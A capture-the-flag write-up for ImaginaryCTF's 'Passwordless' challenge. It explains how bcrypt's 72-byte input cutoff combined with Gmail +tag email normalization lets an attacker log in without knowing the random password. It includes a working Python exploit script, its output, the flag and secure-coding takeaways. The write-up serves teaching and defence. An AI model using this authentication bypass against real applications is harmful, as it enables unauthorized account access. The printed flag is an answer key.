Passwordless Solution
________________________________________
Challenge Overview
We are given a simple Express.js application with login/registration.
The key routes:
•	/register → creates a new user with a random password (email + randomHex(16))
•	/session → login (checks bcrypt.compareSync(password, hash))
•	/dashboard → restricted page that reveals the flag:
<span id="flag"><%- process.env.FLAG %></span>
At first glance, there’s no way to get the random password because the server never emails it.
________________________________________
Vulnerability
The issue lies in how the initial password is generated and stored:
const initialPassword = req.body.email + crypto.randomBytes(16).toString('hex')
bcrypt.hash(initialPassword, 10, ...)
But bcrypt has a 72-byte input limit: anything after 72 bytes is ignored.
That means if we make our email very long, the random suffix will be beyond byte 72 and completely discarded.
So, effectively, the stored hash only depends on the first 72 bytes of the email string we control.
________________________________________
Bypassing Normalization
The server normalizes email addresses with normalize-email before storing and logging in.
That means we can’t just use a giant raw email — it must normalize down to something valid and ≤64 characters.
Luckily, Gmail addresses support subaddressing (+tag).
Example:
•	Raw input: a+AAAAAA...@gmail.com (hundreds of As)
•	Normalized form: a@gmail.com (tag stripped, under 64 chars)
Thus:
1.	On registration, the app stores a user a@gmail.com with a bcrypt hash of the first 72 bytes of our raw email.
2.	On login, we just supply a@gmail.com and use that 72-byte prefix as the password → bcrypt matches → we are authenticated.
________________________________________
Exploit Script
Here’s the Python one-shot exploit we used:
import requests, re

BASE = "http://passwordless.chal.imaginaryctf.org"
s = requests.Session()

# 1) Craft emails
base_local = "a"
tag = "A" * 300
domain = "gmail.com"
raw_email = f"{base_local}+{tag}@{domain}"
norm_email = f"{base_local}@{domain}"

# 2) First 72 bytes = effective bcrypt password
pwd72 = raw_email[:72]

# 3) Register
s.post(f"{BASE}/user", data={"email": raw_email})

# 4) Login
s.post(f"{BASE}/session", data={"email": norm_email, "password": pwd72})

# 5) Fetch dashboard for flag
r = s.get(f"{BASE}/dashboard")
m = re.search(r'<span id="flag">(.*?)</span>', r.text)
print("FLAG:", m.group(1))
________________________________________
Result
Running the script:
[*] Register status: 200
[*] Login status: 200
[*] Dashboard status: 200
[+] FLAG: ictf{8ee2ebc4085927c0dc85f07303354a05}
________________________________________
Takeaways
•	Always be mindful of cryptographic library limits (bcrypt’s 72-byte cutoff).
•	Never base secrets on untrusted input like emails.
•	Input normalization (normalize-email) can introduce unexpected collisions/shortcuts.
Final Flag:
ictf{8ee2ebc4085927c0dc85f07303354a05}
